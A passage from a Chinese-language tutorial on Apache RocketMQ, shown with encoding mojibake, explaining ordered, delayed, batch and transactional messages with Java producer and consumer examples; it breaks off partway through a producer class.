<li><strong>é˜Ÿåˆ—é”æœºåˆ¶</strong>ï¼šæ¶ˆè´¹ç«¯é€šè¿‡<code>ConsumeOrderlyContext</code>è‡ªåŠ¨åŠ é”ï¼Œé˜²æ­¢åŒä¸€é˜Ÿåˆ—è¢«å¤šçº¿ç¨‹å¹¶å‘æ¶ˆè´¹ã€‚</li>
</ul>
<blockquote>
<p>æ¶ˆè´¹è€…éœ€è¦å®ç°MessageListenerOrderlyæ¥â¼ï¼Œå®é™…ä¸Šåœ¨æœåŠ¡ç«¯ï¼Œå¤„ç†MessageListenerOrderlyæ—¶ï¼Œä¼šç»™â¼€ä¸ªMessageQueueåŠ é”ï¼Œæ‹¿åˆ° MessageQueueä¸Šæ‰€æœ‰çš„æ¶ˆæ¯ï¼Œç„¶åå†å»è¯»å–ä¸‹â¼€ä¸ªMessageQueueçš„æ¶ˆæ¯ã€‚</p>
</blockquote>
<p>æ¶ˆè´¹è€…æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java">consumer.registerMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListenerOrderly</span>() {
    <span class="hljs-type">AtomicLong</span> <span class="hljs-variable">consumeTimes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>);
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ConsumeOrderlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context)</span> {
        context.setAutoCommit(<span class="hljs-literal">true</span>);
        System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msgs);
        <span class="hljs-built_in">this</span>.consumeTimes.incrementAndGet();
        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
            context.setSuspendCurrentQueueTimeMillis(<span class="hljs-number">3000</span>);
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
        }

        <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
    }
});
</code></pre>
<p>åŸç†å°±æ˜¯å°†æ¶ˆæ¯éƒ½å‘åˆ°åŒä¸€ä¸ªMessageQueueã€‚å…·ä½“å¯ä»¥çœ‹å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F03fifomessage%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/03fifomessage/" ref="nofollow noopener noreferrer">é¡ºåºæ¶ˆæ¯ | RocketMQ</a></p>
<blockquote>
<p>æ³¨ï¼š</p>
<p>1ã€ä¸€èˆ¬åœºæ™¯ä¸‹æ˜¯å±€éƒ¨æœ‰åºï¼Œå¦‚æœéœ€è¦å…¨å±€æœ‰åºï¼Œé‚£å°±å°†æ¶ˆæ¯ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ª MessageQueue ã€‚</p>
<p>2ã€â½£äº§è€…ç«¯å°½å¯èƒ½å°†åŒä¸€ç»„æœ‰åºæ¶ˆæ¯æ‰“æ•£åˆ°ä¸åŒçš„ MessageQueue ä¸Šï¼Œé¿å…è¿‡äºé›†ä¸­å¯¼è‡´æ•°æ®çƒ­ç‚¹ç«äº‰ã€‚</p>
<p>3ã€æ¶ˆè´¹è€…ç«¯åªè¿›â¾æœ‰é™æ¬¡æ•°çš„é‡è¯•ã€‚å¦‚æœâ¼€æ¡æ¶ˆæ¯å¤„ç†å¤±è´¥ï¼ŒRocketMQä¼šå°†åç»­æ¶ˆæ¯é˜»å¡ä½ï¼Œè®©æ¶ˆè´¹è€…è¿›â¾é‡è¯•ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ¶ˆè´¹è€…â¼€ç›´å¤„ç†å¤±è´¥ï¼Œè¶…è¿‡æœ€â¼¤é‡è¯•æ¬¡æ•°ï¼Œé‚£ä¹ˆRocketMQå°±ä¼šè·³è¿‡è¿™â¼€æ¡æ¶ˆæ¯ï¼Œå¤„ç†åâ¾¯çš„æ¶ˆæ¯ï¼Œè¿™ä¼šé€ æˆæ¶ˆæ¯ä¹±åºã€‚</p>
<p>4ã€æ¶ˆè´¹è€…ç«¯å¦‚æœç¡®å®å¤„ç†é€»è¾‘ä¸­å‡ºç°é—®é¢˜ï¼Œä¸å»ºè®®æŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥è¿”å› <code>ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT</code>ä½œä¸ºæ›¿ä»£ã€‚</p>
</blockquote>
<h3 data-id="heading-24">6 å»¶è¿Ÿæ¶ˆæ¯</h3>
<p>RocketMQ çš„å»¶è¿Ÿæ¶ˆæ¯æ˜¯ä¸€ç§é«˜çº§æ¶ˆæ¯ç‰¹æ€§ï¼ŒæŒ‡æ¶ˆæ¯å‘é€åˆ° Broker åï¼Œä¸ä¼šç«‹å³è¢«æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œè€Œæ˜¯åœ¨æŒ‡å®šæ—¶é—´ï¼ˆæˆ–å»¶è¿Ÿçº§åˆ«å¯¹åº”çš„æ—¶é—´ï¼‰åæ‰æŠ•é€’åˆ°ç›®æ ‡ Topic ä¾›æ¶ˆè´¹è€…å¤„ç†ã€‚è¯¥æœºåˆ¶å¹¿æ³›åº”ç”¨äºè®¢å•è¶…æ—¶å¤„ç†ã€å®šæ—¶ä»»åŠ¡è°ƒåº¦ã€é€šçŸ¥æé†’ç­‰åœºæ™¯ã€‚</p>
<h4 data-id="heading-25">6.1 åŸç†</h4>
<p>æ¶ˆæ¯å‘é€åï¼Œåœ¨å›ºå®šçš„æ—¶é—´åæ‰è¢«æ¶ˆè´¹ï¼Œå®˜æ–¹æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸¤è€…æœ¬è´¨ç›¸åŒï¼Œå‡é€šè¿‡æœåŠ¡ç«¯å®šæ—¶è°ƒåº¦å®ç°ï¼Œ5.x ç‰ˆæœ¬ç»Ÿä¸€ç§°ä¸ºå®šæ—¶æ¶ˆæ¯ã€‚</p>
<ul>
<li>RocketMQ 4.x é»˜è®¤æ”¯æŒ18 ä¸ªå›ºå®šå»¶è¿Ÿçº§åˆ«ï¼Œä¸æ”¯æŒä»»æ„æ—¶é—´å»¶è¿Ÿã€‚</li>
</ul>
<p>Broker é…ç½®å¯è‡ªå®šä¹‰å»¶è¿Ÿçº§åˆ«ï¼š<code>messageDelayLevel=1s 5s 10s 30s 1m ... 1h 2h</code></p>
<ul>
<li>RocketMQ 5.x å¼•å…¥<strong>ç²¾ç¡®å®šæ—¶æ¶ˆæ¯</strong>ï¼Œæ”¯æŒæ¯«ç§’çº§ä»»æ„æ—¶é—´å»¶è¿Ÿï¼Œé€šè¿‡è®¾ç½®ç»å¯¹æ—¶é—´æˆ³å®ç°ã€‚</li>
</ul>
<h4 data-id="heading-26">6.2 ä»£ç æ¡ˆä¾‹</h4>
<p>ç”Ÿäº§è€…çš„æ ¸å¿ƒä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
message.setDelayTimeLevel(<span class="hljs-number">3</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.print(result);
</code></pre>
<p>é€šè¿‡è®¾ç½®å»¶è¿Ÿæ—¶é—´çº§åˆ« <code>message.setDelayTimeLevel(3)</code>ä»£è¡¨ 10 ç§’åå‘é€ã€‚Broker æ¥æ”¶æ¶ˆæ¯åï¼Œåˆ¤æ–­ä¸ºå»¶è¿Ÿæ¶ˆæ¯ï¼Œå°†å…¶æš‚å­˜åˆ°å†…éƒ¨ä¸»é¢˜ <code>SCHEDULE_TOPIC_XXXX</code>ã€‚Broker å¯åŠ¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹æ± ï¼Œæ¯ä¸ªå»¶è¿Ÿçº§åˆ«å¯¹åº”ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œå®šæ—¶ä»»åŠ¡å‘¨æœŸæ€§æ‰«æå¯¹åº”é˜Ÿåˆ—ï¼Œåˆ¤æ–­æ¶ˆæ¯æ˜¯å¦åˆ°æœŸï¼ˆå­˜å‚¨æ—¶é—´ + å»¶è¿Ÿæ—¶é—´â‰¤å½“å‰æ—¶é—´ï¼‰ï¼Œåˆ°æœŸæ¶ˆæ¯è¢«é‡æ–°æŠ•é€’åˆ°åŸå§‹ç›®æ ‡ Topic çš„å¯¹åº”é˜Ÿåˆ—ï¼Œæ¶ˆè´¹è€…æ­¤æ—¶å¯æ­£å¸¸æ¶ˆè´¹è¯¥æ¶ˆæ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
<span class="hljs-comment">//message.setDelayTimeSec(10);</span>
<span class="hljs-comment">// The effect is the same as the above</span>
<span class="hljs-comment">// message.setDelayTimeMs(10_000L);</span>
<span class="hljs-comment">// Set the specific delivery time, and the effect is the same as the above</span>
<span class="hljs-comment">// long deliverTime = LocalDateTime.of(2026, 1, 20, 10, 0, 0)</span>
<span class="hljs-comment">//     .atZone(ZoneId.systemDefault())</span>
<span class="hljs-comment">//     .toInstant()</span>
<span class="hljs-comment">//     .toEpochMilli();</span>
<span class="hljs-comment">// message.setDeliverTimeMs(deliverTime);</span>
message.setDeliverTimeMs(System.currentTimeMillis() + <span class="hljs-number">10_000L</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.printf(result + <span class="hljs-string">"\n"</span>);
</code></pre>
<p>æ—¶é—´è½®å°†æ—¶é—´åˆ’åˆ†ä¸ºå›ºå®šæ§½ä½ï¼Œæ¯ä¸ªæ§½ä½å¯¹åº”ä¸€ä¸ªæ—¶é—´é—´éš”ã€‚æ¶ˆæ¯æ ¹æ®åˆ°æœŸæ—¶é—´æ”¾å…¥å¯¹åº”æ§½ä½ï¼Œé€šè¿‡æŒ‡é’ˆå¾ªç¯æ‰«æå¤„ç†åˆ°æœŸæ¶ˆæ¯ã€‚å…·ä½“å¯ä»¥çœ‹å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2F4.x%2Fproducer%2F04message3%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/4.x/producer/04message3/" ref="nofollow noopener noreferrer">å»¶è¿Ÿæ¶ˆæ¯å‘é€ | RocketMQ</a></p>
<h3 data-id="heading-27">7 æ‰¹é‡æ¶ˆæ¯</h3>
<p>åœ¨å¯¹ååç‡æœ‰ä¸€å®šè¦æ±‚çš„æƒ…å†µä¸‹ï¼ŒApache RocketMQå¯ä»¥å°†ä¸€äº›æ¶ˆæ¯èšæˆä¸€æ‰¹ä»¥åè¿›è¡Œå‘é€ï¼Œå¯ä»¥å¢åŠ ååç‡ï¼Œå¹¶å‡å°‘APIå’Œç½‘ç»œè°ƒç”¨æ¬¡æ•°ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/754201307eb444768f601d7063b74053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=BLwYES%2FKE8GZk329Xnh5dRyoEPQ%3D" alt="" loading="lazy"/></p>
<p>æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ·»åŠ æ‰¹é‡æ¶ˆæ¯</span>
List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(MESSAGE_COUNT);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
    messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, TAG, <span class="hljs-string">"OrderID"</span> + i, (<span class="hljs-string">"Hello world "</span> + i).getBytes(StandardCharsets.UTF_8)));
}

<span class="hljs-comment">// æ¶ˆæ¯è¿‡å¤šéœ€è¦åˆ†ç‰‡</span>
<span class="hljs-type">ListSplitter</span> <span class="hljs-variable">splitter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListSplitter</span>(messages);
<span class="hljs-keyword">while</span> (splitter.hasNext()) {
    List&lt;Message&gt; listItem = splitter.next();
    <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(listItem);
    System.out.printf(<span class="hljs-string">"%s"</span>, sendResult);
}
</code></pre>
<blockquote>
<p>æ³¨ï¼š</p>
<p>æ‰¹é‡æ¶ˆæ¯çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œä½†æ˜¯è¦æ³¨æ„RocketMQåšäº†é™åˆ¶ã€‚åŒä¸€æ‰¹æ¶ˆæ¯çš„Topicå¿…é¡»ç›¸åŒï¼Œå¦å¤–ï¼Œä¸æ”¯æŒå»¶è¿Ÿæ¶ˆæ¯ã€‚</p>
<p>è¿˜æœ‰æ‰¹é‡æ¶ˆæ¯çš„å¤§å°ä¸è¦è¶…è¿‡1Mï¼Œå¦‚æœå¤ªå¤§å°±éœ€è¦è‡ªè¡Œåˆ†å‰²ã€‚</p>
</blockquote>
<h3 data-id="heading-28">8 äº‹åŠ¡æ¶ˆæ¯</h3>
<p>äº‹åŠ¡æ¶ˆæ¯ä¸º Apache RocketMQ ä¸­çš„é«˜çº§ç‰¹æ€§æ¶ˆæ¯ï¼Œæœ¬æ–‡ä¸ºæ‚¨ä»‹ç»äº‹åŠ¡æ¶ˆæ¯çš„åº”ç”¨åœºæ™¯ã€åŠŸèƒ½åŸç†ã€ä½¿ç”¨é™åˆ¶ã€ä½¿ç”¨æ–¹æ³•å’Œä½¿ç”¨å»ºè®®ã€‚</p>
<blockquote>
<p>äº‹åŠ¡æ¶ˆæ¯æ˜¯ Apache RocketMQ æä¾›çš„ä¸€ç§é«˜çº§æ¶ˆæ¯ç±»å‹ï¼Œæ”¯æŒåœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ä¿éšœæ¶ˆæ¯ç”Ÿäº§å’Œæœ¬åœ°äº‹åŠ¡çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
</blockquote>
<h4 data-id="heading-29">8.1 å·¥ä½œæµç¨‹</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6185b6c4e9440eb88353f74cb0a1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=axdr%2BJADgeahEhd%2BWsZlGnoAnto%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ç®€å•çš„æè¿°ä»¥ä¸Šå†…å®¹ï¼ˆåç»­ä¼šæœ‰æ–‡ç« æ¥å•ç‹¬ä»‹ç»ï¼Œå…·ä½“å†…å®¹è¯·çœ‹åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F04transactionmessage%2F%3Ff_link_type%3Df_linkinlinenote%26flow_extra%3DeyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%253D%253D" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage/?f_link_type=f_linkinlinenote&amp;flow_extra=eyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%3D%3D" ref="nofollow noopener noreferrer">äº‹åŠ¡æ¶ˆæ¯ | RocketMQ</a>ï¼‰</p>
<p><strong>é¦–å…ˆ</strong>ï¼Œç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€è‡³Apache RocketMQæœåŠ¡ç«¯ï¼Œå®é™…ä¸Šæ˜¯å‘ Brokerï¼ˆServerï¼‰å‘é€ä¸€æ¡ â€œåŠæ¶ˆæ¯â€ï¼ˆHalf Messageï¼‰ï¼ŒBroker ç¡®è®¤æ¥æ”¶æˆåŠŸåï¼Œè¿™æ¡æ¶ˆæ¯æš‚æ—¶ä¸ä¼šæŠ•é€’ç»™æ¶ˆè´¹è€…ã€‚<strong>ç„¶å</strong>ç”Ÿäº§è€…å¼€å§‹æ‰§è¡Œæœ¬åœ°ä¸šåŠ¡äº‹åŠ¡ï¼ˆæ¯”å¦‚æ•°æ®åº“æ“ä½œï¼‰ï¼Œç¡®ä¿ä¸šåŠ¡é€»è¾‘å’Œæ¶ˆæ¯å‘é€çš„ä¸€è‡´æ€§ã€‚<strong>æ¥ç€</strong>æœ¬åœ°äº‹åŠ¡æ‰§è¡Œå®Œæˆåï¼Œç”Ÿäº§è€…å‘ Broker å‘é€ Commitï¼ˆäº‹åŠ¡æˆåŠŸï¼‰æˆ– Rollbackï¼ˆäº‹åŠ¡å¤±è´¥ï¼‰æŒ‡ä»¤ï¼Œå‘ŠçŸ¥ Broker æœ€ç»ˆå¤„ç†ç»“æœã€‚äº‹åŠ¡çŠ¶æ€å›æŸ¥æœ‰è¡¥å¿æœºåˆ¶ï¼Œå¦‚æœ Broker é•¿æ—¶é—´æœªæ”¶åˆ°ç”Ÿäº§è€…çš„æŒ‡ä»¤ï¼Œä¼šä¸»åŠ¨è§¦å‘äº‹åŠ¡å›æŸ¥ï¼Œå‘ç”Ÿäº§è€…è¯¢é—®æœ¬åœ°äº‹åŠ¡çš„æœ€ç»ˆçŠ¶æ€ï¼›ç”Ÿäº§è€…é‡æ–°æ£€æŸ¥æœ¬åœ°äº‹åŠ¡å¹¶åé¦ˆç»“æœã€‚<strong>æœ€å</strong> Broker æ”¶åˆ° Commit æŒ‡ä»¤æ—¶ï¼Œä¼šå°†åŠæ¶ˆæ¯æ­£å¼æŠ•é€’ç»™æ¶ˆè´¹è€…ï¼ˆSubscriberï¼‰ï¼›æ”¶åˆ° Rollback æŒ‡ä»¤æ—¶ï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒåŠæ¶ˆæ¯ï¼Œä¸è¿›è¡ŒæŠ•é€’ã€‚</p>
</blockquote>
<h4 data-id="heading-30">8.2 ç”Ÿå‘½å‘¨æœŸ</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95a4613d1ba6427ba226dca41bee43a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=pS%2BjqErIaer6goD3KOZxKMUKN3Q%3D" alt="" loading="lazy"/></p>
<ul>
<li>åˆå§‹åŒ–ï¼šåŠäº‹åŠ¡æ¶ˆæ¯è¢«ç”Ÿäº§è€…æ„å»ºå¹¶å®Œæˆåˆå§‹åŒ–ï¼Œå¾…å‘é€åˆ°æœåŠ¡ç«¯çš„çŠ¶æ€ã€‚</li>
<li>äº‹åŠ¡å¾…æäº¤ï¼šåŠäº‹åŠ¡æ¶ˆæ¯è¢«å‘é€åˆ°æœåŠ¡ç«¯ï¼Œå’Œæ™®é€šæ¶ˆæ¯ä¸åŒï¼Œå¹¶ä¸ä¼šç›´æ¥è¢«æœåŠ¡ç«¯æŒä¹…åŒ–ï¼Œè€Œæ˜¯ä¼šè¢«å•ç‹¬å­˜å‚¨åˆ°äº‹åŠ¡å­˜å‚¨ç³»ç»Ÿä¸­ï¼Œç­‰å¾…ç¬¬äºŒé˜¶æ®µæœ¬åœ°äº‹åŠ¡è¿”å›æ‰§è¡Œç»“æœåå†æäº¤ã€‚æ­¤æ—¶æ¶ˆæ¯å¯¹ä¸‹æ¸¸æ¶ˆè´¹è€…ä¸å¯è§ã€‚</li>
<li>æ¶ˆæ¯å›æ»šï¼šç¬¬äºŒé˜¶æ®µå¦‚æœäº‹åŠ¡æ‰§è¡Œç»“æœæ˜ç¡®ä¸ºå›æ»šï¼ŒæœåŠ¡ç«¯ä¼šå°†åŠäº‹åŠ¡æ¶ˆæ¯å›æ»šï¼Œè¯¥äº‹åŠ¡æ¶ˆæ¯æµç¨‹ç»ˆæ­¢ã€‚</li>
<li>æäº¤å¾…æ¶ˆè´¹ï¼šç¬¬äºŒé˜¶æ®µå¦‚æœäº‹åŠ¡æ‰§è¡Œç»“æœæ˜ç¡®ä¸ºæäº¤ï¼ŒæœåŠ¡ç«¯ä¼šå°†åŠäº‹åŠ¡æ¶ˆæ¯é‡æ–°å­˜å‚¨åˆ°æ™®é€šå­˜å‚¨ç³»ç»Ÿä¸­ï¼Œæ­¤æ—¶æ¶ˆæ¯å¯¹ä¸‹æ¸¸æ¶ˆè´¹è€…å¯è§ï¼Œç­‰å¾…è¢«æ¶ˆè´¹è€…è·å–å¹¶æ¶ˆè´¹ã€‚</li>
<li>æ¶ˆè´¹ä¸­ï¼šæ¶ˆæ¯è¢«æ¶ˆè´¹è€…è·å–ï¼Œå¹¶æŒ‰ç…§æ¶ˆè´¹è€…æœ¬åœ°çš„ä¸šåŠ¡é€»è¾‘è¿›è¡Œå¤„ç†çš„è¿‡ç¨‹ã€‚ æ­¤æ—¶æœåŠ¡ç«¯ä¼šç­‰å¾…æ¶ˆè´¹è€…å®Œæˆæ¶ˆè´¹å¹¶æäº¤æ¶ˆè´¹ç»“æœï¼Œå¦‚æœä¸€å®šæ—¶é—´åæ²¡æœ‰æ”¶åˆ°æ¶ˆè´¹è€…çš„å“åº”ï¼ŒApache RocketMQä¼šå¯¹æ¶ˆæ¯è¿›è¡Œé‡è¯•å¤„ç†ã€‚å…·ä½“ä¿¡æ¯ã€‚</li>
<li>æ¶ˆè´¹æäº¤ï¼šæ¶ˆè´¹è€…å®Œæˆæ¶ˆè´¹å¤„ç†ï¼Œå¹¶å‘æœåŠ¡ç«¯æäº¤æ¶ˆè´¹ç»“æœï¼ŒæœåŠ¡ç«¯æ ‡è®°å½“å‰æ¶ˆæ¯å·²ç»è¢«å¤„ç†ï¼ˆåŒ…æ‹¬æ¶ˆè´¹æˆåŠŸå’Œå¤±è´¥ï¼‰ã€‚ Apache RocketMQé»˜è®¤æ”¯æŒä¿ç•™æ‰€æœ‰æ¶ˆæ¯ï¼Œæ­¤æ—¶æ¶ˆæ¯æ•°æ®å¹¶ä¸ä¼šç«‹å³è¢«åˆ é™¤ï¼Œåªæ˜¯é€»è¾‘æ ‡è®°å·²æ¶ˆè´¹ã€‚æ¶ˆæ¯åœ¨ä¿å­˜æ—¶é—´åˆ°æœŸæˆ–å­˜å‚¨ç©ºé—´ä¸è¶³è¢«åˆ é™¤å‰ï¼Œæ¶ˆè´¹è€…ä»ç„¶å¯ä»¥å›æº¯æ¶ˆæ¯é‡æ–°æ¶ˆè´¹ã€‚</li>
<li>æ¶ˆæ¯åˆ é™¤ï¼šApache RocketMQæŒ‰ç…§æ¶ˆæ¯ä¿å­˜æœºåˆ¶æ»šåŠ¨æ¸…ç†æœ€æ—©çš„æ¶ˆæ¯æ•°æ®ï¼Œå°†æ¶ˆæ¯ä»ç‰©ç†æ–‡ä»¶ä¸­åˆ é™¤ã€‚</li>
</ul>
<h4 data-id="heading-31">8.3 å®˜æ–¹å®ä¾‹ä»£ç </h4>
<p>â‘  å®ç° TransactionListener æ¥å£</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionListenerImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TransactionListener</span> {
    <span class="hljs-comment">// åŸå­æ•´å‹ï¼šç”Ÿæˆè‡ªå¢æ•°å€¼ï¼Œæ¨¡æ‹Ÿä¸åŒçš„æœ¬åœ°äº‹åŠ¡ç»“æœï¼ˆçº¿ç¨‹å®‰å…¨ï¼Œé€‚é…å¤šçº¿ç¨‹å‘é€åœºæ™¯ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">transactionIndex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    <span class="hljs-comment">// å¹¶å‘å“ˆå¸Œè¡¨ï¼šå­˜å‚¨ã€Œäº‹åŠ¡æ¶ˆæ¯ID-äº‹åŠ¡çŠ¶æ€ã€çš„æ˜ å°„ï¼Œä¾›å›æŸ¥æ—¶ä½¿ç”¨ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</span>
    <span class="hljs-keyword">private</span> ConcurrentHashMap&lt;String, Integer&gt; localTrans = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">executeLocalTransaction</span><span class="hljs-params">(Message msg, Object arg)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> transactionIndex.getAndIncrement();
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> value % <span class="hljs-number">3</span>;
        localTrans.put(msg.getTransactionId(), status);
        <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
    }

    <span class="hljs-comment">// å›æŸ¥äº‹åŠ¡çŠ¶æ€</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">checkLocalTransaction</span><span class="hljs-params">(MessageExt msg)</span> {
        <span class="hljs-type">Integer</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> localTrans.get(msg.getTransactionId());
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != status) {
            <span class="hljs-keyword">switch</span> (status) {
                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;
                <span class="hljs-keyword">default</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
            }
        }
        <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
    }
}
</code></pre>
<p>â‘¡ ç”Ÿäº§è€…</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"please_rename_unique_group_name"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest1234"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
